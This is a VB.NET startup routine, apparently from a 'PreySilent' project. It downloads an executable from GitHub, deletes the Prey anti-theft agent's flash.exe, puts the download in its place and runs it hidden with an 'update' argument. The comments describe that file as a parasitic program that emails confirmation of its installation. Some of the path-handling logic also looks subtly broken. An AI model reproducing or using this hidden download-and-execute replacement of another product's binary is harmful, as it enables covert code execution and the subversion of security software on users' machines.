Imports System.IO
Imports System.Net
Imports Microsoft.VisualBasic.ApplicationServices

Namespace My
    ' 以下事件可用于 MyApplication: 
    ' Startup: 应用程序启动时在创建启动窗体之前引发。
    ' Shutdown: 在关闭所有应用程序窗体后引发。 如果应用程序异常终止，则不会引发此事件。
    ' UnhandledException: 在应用程序遇到未经处理的异常时引发。
    ' StartupNextInstance: 在启动单实例应用程序且应用程序已处于活动状态时引发。
    ' NetworkAvailabilityChanged: 在连接或断开网络连接时引发。
    Partial Friend Class MyApplication

        '网络下载文件相关
        Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Integer, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Integer, ByVal lpfnCB As Integer) As Integer
        '调用外部程序
        Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Integer, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Integer) As Integer
        '用于确定文件路径
        Dim PreyDirectory As String = Environment.GetFolderPath(Environment.SpecialFolder.Windows) & "\Prey"
        Dim PreyVireion As String = GetHighestVersion(PreyDirectory & "\versions\")
        Dim FlashPath As String = PreyDirectory & "\versions\" & PreyVireion & "\lib\agent\actions\alert\win32\flash.exe"
        Dim AlarmDirectory As String = PreyDirectory & "\versions\" & PreyVireion & "\lib\agent\actions\alarm\bin\"
        Dim BackupPath As String = AlarmDirectory & "flash_bak"
        Dim GitHubURL As String = "https://raw.githubusercontent.com/CuteLeon/PreySilent/master/Prey-Silent/Resources/Flash.exe"

        Private Sub MyApplication_Startup(sender As Object, e As StartupEventArgs) Handles Me.Startup
            Try
                Dim DownloadClient As WebClient = New WebClient
                '首先判断本目录是否有 flash 文件的备份(文件名为 flash_bak，由 Prey-Silent 释放)
                If File.Exists(BackupPath) Then File.Delete(BackupPath)

                '备份文件不在时需要从 GitHub 下载，当下载失败时，退出
                DownloadClient.DownloadFile(GitHubURL, BackupPath)

                '如果 flash.exe 存在就删除再复制，可以利用这一特性用于 flash 升级
                If File.Exists(FlashPath) Then File.Delete(FlashPath)

                '开始使用 cmd 值守程序退出之后恢复
                RecoveryFlash()

                '使用 [update] 参数调用 寄生程序 ，接收安装/更新成功提示邮件
                ShellExecute(0, vbNullString, FlashPath, "update", vbNullString, vbHide)

                End
            Catch ex As Exception
                End
            End Try
        End Sub

        ''' <summary>
        ''' 用来恢复被删除的 flash 程序
        ''' </summary>
        Private Sub RecoveryFlash()
            '计划委托 cmd 值守等待本进程结束之后再复制文件
            Shell("cmd.exe /c copy " & BackupPath & " " & FlashPath, vbHide, True)
        End Sub

        ''' <summary>
        ''' 获取软件目录里最新版本目录名称
        ''' </summary>
        Private Function GetHighestVersion(SoftwareDirectory As String) As String
            Dim VersionDir() As String = Directory.GetDirectories(SoftwareDirectory)
            If VersionDir.Length = 1 Then Return VersionDir.First
            Dim HighVersion As Version = New Version("0.0.0")
            Dim TempVersion As Version
            For Each VersionStr In VersionDir
                TempVersion = New Version(VersionStr.Split("\").Last)
                HighVersion = IIf(TempVersion > HighVersion, TempVersion, HighVersion)
            Next
            Return HighVersion.ToString()
        End Function

    End Class
End Namespace
